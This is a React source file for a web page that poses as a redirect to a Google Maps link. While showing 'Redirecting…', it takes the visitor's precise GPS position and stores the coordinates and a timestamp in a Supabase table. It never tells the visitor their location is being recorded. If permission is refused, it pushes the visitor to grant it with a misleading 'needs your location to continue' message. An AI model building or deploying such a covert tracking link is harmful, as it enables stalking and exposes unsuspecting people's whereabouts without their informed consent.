import { useState, useEffect } from "react";
import { supabase } from "./supabase";
import "./App.css";

function App() {
  // 'requesting', 'denied', 'success'
  const [status, setStatus] = useState("requesting");

  // how precise we need the fix (in meters)
  const DESIRED_ACCURACY = 20;

  useEffect(() => {
    if (!navigator.geolocation) {
      console.error("Geolocation is not supported");
      redirectToLocation();
      return;
    }
    startWatching();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const startWatching = () => {
    setStatus("requesting");

    const options = {
      enableHighAccuracy: true, // ask for GPS
      maximumAge: 0,            // no cached positions
      timeout: 20000,           // give it up to 20s
    };

    const watchId = navigator.geolocation.watchPosition(
      async (pos) => {
        const { latitude, longitude, accuracy } = pos.coords;
        console.log(`Update: accuracy=${accuracy}m`);

        if (accuracy <= DESIRED_ACCURACY) {
          // Got a good GPS lock—stop watching and proceed
          navigator.geolocation.clearWatch(watchId);
          await saveAndRedirect(latitude, longitude);
        } else {
          // Still waiting for better precision
          // (Optionally, you could show a UI hint if accuracy stays poor)
        }
      },
      (err) => {
        console.error("Geolocation error:", err);
        navigator.geolocation.clearWatch(watchId);

        if (err.code === 1) {
          // User denied permission
          setStatus("denied");
        } else {
          // Other errors (timeout, unavailable)
          redirectToLocation();
        }
      },
      options
    );
  };

  const saveAndRedirect = async (latitude, longitude) => {
    try {
      const { error } = await supabase.from("locations").insert([
        {
          latitude,
          longitude,
          timestamp: new Date().toISOString(),
        },
      ]);
      if (error) console.error("Supabase insert error:", error);
    } catch (e) {
      console.error("Unexpected error saving location:", e);
    }

    setStatus("success");
    redirectToLocation();
  };

  const redirectToLocation = () => {
    const specificLocationUrl = "https://maps.app.goo.gl/TSZQucADCqHnj5odA";
    setTimeout(() => {
      window.location.href = specificLocationUrl;
    }, 1500);
  };

  return (
    <div className="loader-container">
      {(status === "requesting" || status === "success") && (
        <>
          <div className="loader"></div>
          <h2 className="redirecting-text">Redirecting…</h2>
          {/* Optional Android hint */}
          <p className="accuracy-hint">
            If location seems off on Android, switch your Location Mode to
            “High accuracy” in Settings → Location.
          </p>
        </>
      )}

      {status === "denied" && (
        <div className="location-denied">
          <div className="location-icon">📍</div>
          <h2>Location Access Required</h2>
          <p>This site needs your location to continue.</p>
          <p className="instructions">
            Please enable location services in your browser settings and try
            again.
          </p>
          <button className="retry-button" onClick={startWatching}>
            Enable Location Access
          </button>
        </div>
      )}
    </div>
  );
}

export default App;
